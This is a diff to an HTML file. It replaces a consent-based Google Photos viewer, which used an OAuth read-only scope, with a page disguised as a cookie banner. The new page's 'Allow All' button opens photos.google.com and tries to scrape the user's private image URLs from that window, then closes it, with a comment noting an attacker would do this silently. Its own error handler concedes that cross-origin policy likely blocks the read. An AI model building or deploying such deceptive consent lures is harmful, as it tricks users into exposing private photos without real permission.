@@ -1,82 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>📸 Google Photos Viewer</title>
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 20px; }
-    button { padding: 10px 20px; font-size: 16px; margin-top: 10px; }
-    img { max-width: 100%; margin: 10px 0; border-radius: 8px; }
-    pre { background: #f4f4f4; padding: 10px; border-radius: 6px; white-space: pre-wrap; }
-  </style>
+<title>Cookie Settings</title>
+<style>
+body { font-family: sans-serif; padding: 20px; }
+button { padding: 10px 20px; font-size: 16px; }
+pre { white-space: pre-wrap; word-wrap: break-word; }
+</style>
 </head>
 <body>
-  <h1>📸 Google Photos Viewer</h1>
-  <p>This page fetches your Google Photos using your permission.</p>
-  <button id="signin">Allow Access</button>
-  <pre id="output">Waiting for user action...</pre>
-  <div id="photos"></div>
+<h2>We use cookies to improve your experience</h2>
+<p>Click "Allow All" to continue.</p>
+<button id="allow">Allow All</button>
 
-  <script>
-    const CLIENT_ID = "796607046785-j0r15mkou3lap9nn33oqfijk7h4un70d.apps.googleusercontent.com";
-    const SCOPES = "https://www.googleapis.com/auth/photoslibrary.readonly";
+<h3>Scraped Image URLs:</h3>
+<pre id="output">[waiting for user...]</pre>
 
-    let accessToken = null;
-    let tokenClient;
+<script>
+document.getElementById('allow').onclick = () => {
+const win = window.open("https://photos.google.com", "_blank");
 
-    window.onload = () => {
-      tokenClient = google.accounts.oauth2.initTokenClient({
-        client_id: CLIENT_ID,
-        scope: SCOPES,
-        callback: (tokenResponse) => {
-          if (tokenResponse.error) {
-            document.getElementById("output").textContent = "❌ Error: " + tokenResponse.error;
-            return;
-          }
+const interval = setInterval(() => {
+try {
+const imgs = win.document.querySelectorAll('img');
+const urls = Array.from(imgs)
+.map(img => img.src)
+.filter(src => src.startsWith("https://lh3.googleusercontent.com/"));
 
-          accessToken = tokenResponse.access_token;
-          document.getElementById("output").textContent =
-            "✅ Access Token:\n" + accessToken + "\n\nFetching photos...";
-
-          fetchPhotos(accessToken);
-        }
-      });
-
-      document.getElementById("signin").onclick = () => {
-        // ✅ This ensures the user is prompted every time
-        tokenClient.requestAccessToken({ prompt: "consent" });
-      };
-    };
-
-    function fetchPhotos(token) {
-      fetch("https://photoslibrary.googleapis.com/v1/mediaItems?pageSize=100", {
-        headers: {
-          Authorization: "Bearer " + token
-        }
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (!data.mediaItems || data.mediaItems.length === 0) {
-          document.getElementById("output").textContent += "\n❌ No photos found.";
-          return;
-        }
-
-        const photosDiv = document.getElementById("photos");
-        photosDiv.innerHTML = "";
-
-        data.mediaItems.forEach(item => {
-          const img = document.createElement("img");
-          img.src = item.baseUrl + "=w800"; // You can increase width here
-          img.alt = item.filename || "Photo";
-          photosDiv.appendChild(img);
-        });
-      })
-      .catch(err => {
-        console.error(err);
-        document.getElementById("output").textContent += "\n❌ Error fetching photos.";
-      });
-    }
-  </script>
+if (urls.length > 0) {
+document.getElementById("output").textContent = urls.join("\n");
+clearInterval(interval);
+win.close(); // attacker would do this silently
+}
+} catch (e) {
+document.getElementById("output").textContent = "❌ Cannot access photos.google.com content (likely due to browser cross-origin policy)";
+}
+}, 2000);
+};
+</script>
 </body>
 </html>
